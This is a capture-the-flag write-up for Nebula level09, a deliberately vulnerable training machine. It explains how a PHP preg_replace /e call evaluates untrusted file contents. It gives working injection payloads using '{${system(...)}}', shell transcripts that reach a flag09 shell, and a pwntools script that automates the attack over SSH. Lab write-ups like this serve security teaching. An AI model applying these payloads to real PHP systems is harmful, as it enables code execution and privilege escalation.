# Level09

#### Description

There’s a C setuid wrapper for some vulnerable PHP code.

To do this level, log in as the **level09** account with the password **level09**. Files for this level can be found in /home/flag09.

#### Source Code

```php
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

#### Solution

1. `file_get_contents($filename)` reads untrusted file contents (the file name comes from `argv[1]` with no validation).
2. `preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);` uses the `/e` modifier, which tells PHP to evaluate the replacement string as PHP code. The replacement string embeds the captured group (`\2`) directly inside that evaluated code.
3. An attacker controlling the text captured by `(.*)` can craft content that breaks out of the quoted string in the replacement and inject arbitrary PHP code — which will be executed.

Because the captured portion (`\2`) is attacker-controlled and gets inserted into evaluated PHP, the script effectively performs `eval()` on untrusted input.

Here, we cannot just simply do `system(command)` as it will interpret it as a normal string to make our payload work we have to use PHP Complex curly Syntax, So system function get called with our command as parameter. like these:

<pre class="language-php"><code class="lang-php"><strong>[email {${system(command)}}]
</strong></code></pre>

```bash
level09@nebula:/home/flag09$ echo '[email {${system(id)}}]' > /tmp/file 
level09@nebula:/home/flag09$ ./flag09 /tmp/file
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
PHP Notice:  Use of undefined constant id - assumed 'id' in /home/flag09/flag09.php(15) : regexp code on line 1
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
PHP Notice:  Undefined variable: uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09) in /home/flag09/flag09.php(15) : regexp code on line 1
```

As we can see, this program successfully executed our id command, so next we can use getflag command also.

```bash
level09@nebula:/home/flag09$ echo '[email {${system(getflag)}}]' > /tmp/file 
level09@nebula:/home/flag09$ ./flag09 /tmp/file
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/flag09/flag09.php(15) : regexp code on line 1
You have successfully executed getflag on a target account
PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1
```

And we can also try to use `$use_me` parameter from markup function as it was not used anywhere

```bash
level09@nebula:/home/flag09$ echo '[email {${system($use_me)}}]' > /tmp/file 
level09@nebula:/home/flag09$ ./flag09 /tmp/file sh
sh-4.2$ id
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

#### Python Automation

```python
from pwn import *
from sys import argv, exit

# Check if IP address is provided as an argument
if len(argv) < 2:
    sys.exit("IP address not found.")

# Establishes SSH connection with target IP address
session = ssh(host=argv[1], user='level09', password='level09')

terminal = session.shell()
terminal.sendline("echo '[email {${system($use_me)}}]' > /tmp/file")
terminal.sendline(" /home/flag09/flag09 /tmp/file sh")
terminal.recvuntil("$ ")
terminal.sendline("id && getflag")
terminal.interactive()
```

<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
